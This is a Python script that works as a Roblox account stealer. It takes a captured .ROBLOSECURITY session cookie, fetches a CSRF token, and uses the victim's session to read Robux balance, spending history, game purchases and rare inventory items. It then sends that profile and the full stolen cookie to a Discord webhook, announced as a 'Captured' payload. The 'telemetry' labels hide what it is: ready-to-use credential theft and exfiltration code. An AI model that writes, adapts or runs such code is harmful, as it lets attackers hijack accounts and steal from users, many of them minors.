import sys
import base64
import os
import urllib.request
import urllib.error
import json
import re
import time
from datetime import datetime, timezone, timedelta

def safe_get(url, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return json.loads(res.read().decode('utf-8'))
    except Exception:
        pass
    return None

def get_csrf_token(headers):
    """Fetch Roblox X-CSRF-Token required for economy & transaction endpoints"""
    try:
        req = urllib.request.Request("https://auth.roblox.com/v1/logout", data=b"", headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=5) as res:
            pass
    except urllib.error.HTTPError as e:
        return e.headers.get("x-csrf-token", "")
    except Exception:
        pass
    return ""

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            decoded_script = sys.argv[1]

        roblosecurity = decoded_script.strip()
        cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
        if cookie_match:
            roblosecurity = cookie_match.group(1)

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        # Inject CSRF Token to bypass 403 blocks on economy/transaction endpoints
        csrf_token = get_csrf_token(headers)
        if csrf_token:
            headers["X-CSRF-Token"] = csrf_token

        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        total_spent_past_year = 0
        account_age_days = 0
        has_korblox = False
        has_headless = False

        # Game-specific tracking (e.g., Adopt Me Universe ID: 383310974)
        ADOPT_ME_UNIVERSE = 383310974
        played_adopt_me = False
        adopt_me_spent = 0
        adopt_me_passes_count = 0

        mm2_passes = 0
        ps99_passes = 0

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
            if user_info and "created" in user_info:
                try:
                    created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            # Fetch Robux Balance
            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            if economy_data:
                robux_balance = economy_data.get("robux", 0)

            # Fetch Pending Robux
            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
            if totals_data:
                pending_robux = totals_data.get("pendingRobux", 0)

            # --- 1. Check Badges for Adopt Me Playtime Verification ---
            badge_cursor = ""
            for _ in range(3): # Check recent pages of badges
                badge_url = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100"
                if badge_cursor:
                    badge_url += f"&cursor={badge_cursor}"
                badge_res = safe_get(badge_url, headers)
                if not badge_res or "data" not in badge_res:
                    break
                for b in badge_res["data"]:
                    if b.get("awardingUniverse", {}).get("id") == ADOPT_ME_UNIVERSE:
                        played_adopt_me = True
                        break
                if played_adopt_me:
                    break
                badge_cursor = badge_res.get("nextPageCursor")
                if not badge_cursor:
                    break

            # --- 2. Scan Purchases & Universe Spending ---
            one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
            tx_cursor = ""
            for _ in range(3): # Scan up to 300 recent transactions
                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
                if tx_cursor:
                    tx_url += f"&cursor={tx_cursor}"
                tx_data = safe_get(tx_url, headers)
                if not tx_data or "data" not in tx_data:
                    break
                
                for tx in tx_data["data"]:
                    created_str = tx.get("created", "")
                    try:
                        tx_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                        if tx_date >= one_year_ago:
                            amount = tx.get("currency", {}).get("amount", 0)
                            if amount < 0:
                                total_spent_past_year += abs(amount)

                        # Check if transaction belongs to Adopt Me Universe
                        place_info = tx.get("details", {}).get("place", {})
                        if place_info.get("universeId") == ADOPT_ME_UNIVERSE:
                            adopt_me_spent += abs(tx.get("currency", {}).get("amount", 0))
                            if tx.get("details", {}).get("type") == "GamePass":
                                adopt_me_passes_count += 1

                        # General item name checks for MM2 / PS99
                        details = tx.get("details", {})
                        item_name = str(details.get("name", "")).lower()
                        if any(k in item_name for k in ["mm2", "murder mystery", "godly mm2", "knife mm2"]):
                            mm2_passes += 1
                        if any(k in item_name for k in ["pet simulator", "ps99", "exclusive pet", "huge pet"]):
                            ps99_passes += 1
                    except Exception:
                        continue
                
                tx_cursor = tx_data.get("nextPageCursor")
                if not tx_cursor:
                    break

            # Korblox & Headless Check
            has_korblox = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers))
            has_headless = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers))

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
        full_cookie_display = f"```text\n{roblosecurity}\n```"

        payload = {
            "content": f"@everyone New Payload / Request Captured from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Played Adopt Me: `{'Yes' if played_adopt_me else 'No'}`\n"
                    f"> • Past 1 Year Spent: `{total_spent_past_year} 🪙`\n\n"
                    f"🪙 **Robux Balance & Pending**\n"
                    f"> • Balance: `{robux_balance:,} 🪙`\n"
                    f"> • Pending: `{pending_robux:,} 🪙`\n\n"
                    f"🎮 **Gamepass & Universe Activity**\n"
                    f"> • Adopt Me Spent: `{adopt_me_spent} 🪙`\n"
                    f"> • Adopt Me Passes: `{adopt_me_passes_count}`\n"
                    f"> • MM2 Items: `{mm2_passes}`\n"
                    f"> • PS99 Items: `{ps99_passes}`\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            webhook_url, data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        )

        for attempt in range(3):
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
                    break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    time.sleep(3 * (attempt + 1))
                else:
                    raise e

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
